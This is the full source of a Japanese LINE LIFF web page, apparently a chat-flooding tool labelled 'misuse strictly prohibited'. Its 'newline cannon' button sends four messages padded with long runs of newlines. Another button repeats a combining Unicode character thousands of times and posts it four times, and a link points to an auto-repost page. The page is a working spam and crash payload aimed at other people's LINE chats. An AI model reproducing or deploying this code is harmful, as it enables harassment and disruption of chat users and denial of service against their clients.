<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LIFFユニマク</title>
    <link href="style.css" rel="stylesheet">
    
</head>
<body>
    
        <h1>LIFFユニマク悪用厳禁</h1>
        <p>name:<span id="name">name</span></p>
        <p>type:<span id="typ">type</span></p>
        <p>error:<span id="err"></span></p>
        <p><a href="unicode.html">自動連投</a></p>
        
        <button type="button" onclick=location.reload() >再読込</button>
        <button type="button" onclick=sendMessage() >改行砲</button><br>
        <button type="button" onclick=run() >ユニコ手動投下</button>
        <section>        
        <input type="text" id="1str" size="20" value=""><br>
        <p>　　　　+</p>
        unicode<input type="text" id="uni" size="20" value="͢͢"><br>
        倍率<input type="number" id="xint" size="10" value="5120"><br>
        <p>　　　　+</p>
        <input type="text" id="2str" size="20" value=""><br>
        </section>
        <br><br>
        <p>info:<span id="info"></span></p>
    
    <script src='https://static.line-scdn.net/liff/edge/2/sdk.js'></script>
    <script>
        const name = '名前が不明です';
        const liffId='1661226722-beANnaeG';
        liff.init({
            liffId: liffId // Use own liffId
        }).then(() => {
            getProfile();
        }).catch((err) => {
            document.getElementById('err').innerHTML= err
        }).then(() => {
            isliff();
        }).catch((err) => {
            document.getElementById('err').innerHTML= err    
        }).then(() => {
            gettype();
        }).catch((err) => {
            document.getElementById('err').innerHTML= err
        })

        function getProfile(){
            liff.getProfile()
            .then((profile) => {
                const name = profile.displayName;
                const displayName = document.getElementById('name');
                displayName.innerHTML= name;
            })
            .catch((err) => {
                document.getElementById('err').innerHTML= err
            });
        }

        function sendMessage(){
            liff.sendMessages([
                {
                type: 'text',
                text: "l\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nl",
                },{
                type: 'text',
                text: "l\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nl",
                },{
                type: 'text',
                text: "l\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nl",
                },{
                type: 'text',
                text: "l\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nl",
                },
            ]).then(() => {
                document.getElementById('err').innerHTML= ""
            })
            .catch((err) => {
                document.getElementById('err').innerHTML= err
            });
        }
        function gettype(){
            const context = liff.getContext();

            document.getElementById('typ').innerHTML= context.type
            
      }
    
        function run(){
            var msg = document.getElementById("uni").value;
            var bef = document.getElementById("1str").value;
            var aft = document.getElementById("2str").value;
            var x = document.getElementById("xint").value;
            msg=msg.repeat(x);
            msg=bef+msg+aft;
        //document.getElementById('err').innerHTML= msg;
            sendMsg(msg);
        }
        
        function isliff(){
            if (!(liff.isInClient())){
                location.href='https://line.me'
        }
            const context = JSON.stringify(liff.getContext());
            const idtext = JSON.stringify(liff.getDecodedIDToken());
            document.getElementById('info').innerHTML=idtext+'\n'+context;
        }

        function sendMsg(msg){
            liff.sendMessages([
                {
                type: 'text',
                text: msg,
                },
                {
                type: 'text',
                text: msg,
                },
                {
                type: 'text',
                text: msg,
                },
                {
                type: 'text',
                text: msg,
                },
            ]).then(() => {
                document.getElementById('err').innerHTML= ""
                    })
            .catch((err) => {
                document.getElementById('err').innerHTML= err
            })
        }
    </script>
</body>
</html>
